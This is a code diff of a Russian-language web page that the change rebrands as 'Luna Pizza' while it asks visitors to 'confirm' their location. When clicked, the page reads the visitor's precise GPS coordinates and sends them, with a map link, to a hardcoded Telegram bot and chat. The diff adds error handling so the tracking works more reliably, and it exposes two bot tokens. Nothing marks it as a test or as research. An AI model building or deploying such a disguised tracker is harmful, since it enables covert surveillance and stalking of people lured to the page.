@@ -38,37 +38,49 @@
       -webkit-tap-highlight-color: transparent;
     }
     button:active { opacity: 0.8; }
-    #status { margin-top: 15px; font-size: 14px; color: #8e8e93; }
+    #status { margin-top: 15px; font-size: 14px; color: #8e8e93; word-break: break-word; }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h2>Геолокация</h2>
+    <h2>Luna Pizza</h2>
     <p>Пожалуйста, подтвердите ваше текущее местоположение.</p>
     <button onclick="getSingleLocation()">Подтвердить</button>
     <div id="status"></div>
   </div>
 
   <script>
-    const BOT_TOKEN = '8984067467:AAHDn3dD7_IPSsBHq8R51IWe70lW71b5q3E';
+    const BOT_TOKEN = '8984067467:AAGtxQjP05KuIm6h1_wGUsW-i8ce6wqkeBs';
     const CHAT_ID = '8580445561';
 
     async function sendToTelegram(lat, lon, accuracy) {
+      const status = document.getElementById('status');
       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-      const text = `📍 *Геопозиция получена!*\n\n• Координаты: \`${lat},${lon}\`\n• Точность: ~${accuracy} м\n\n[Открыть на Google Картах](${mapUrl})`;
+      const text = `📍 *Геопозиция получена!*\n\n• Координаты: ${lat}, ${lon}\n• Точность: ~${accuracy} м\n\n[Открыть на Google Картах](${mapUrl})`;
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-      });
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        });
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
-      });
+        const data = await res.json();
+
+        if (data.ok) {
+          status.innerText = "Успешно отправлено!";
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+          });
+        } else {
+          status.innerText = "Ошибка Telegram: " + data.description;
+        }
+      } catch (err) {
+        status.innerText = "Ошибка сети: " + err.message;
+      }
     }
 
     function getSingleLocation() {
@@ -80,15 +92,14 @@
       status.innerText = "Определение координат...";
 
       navigator.geolocation.getCurrentPosition(
-        async (position) => {
+        (position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
           const accuracy = Math.round(position.coords.accuracy);
-          status.innerText = "Успешно отправлено!";
-          await sendToTelegram(lat, lon, accuracy);
+          sendToTelegram(lat, lon, accuracy);
         },
         (error) => {
-          status.innerText = "Ошибка получения геопозиции.";
+          status.innerText = "Ошибка доступа к GPS.";
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
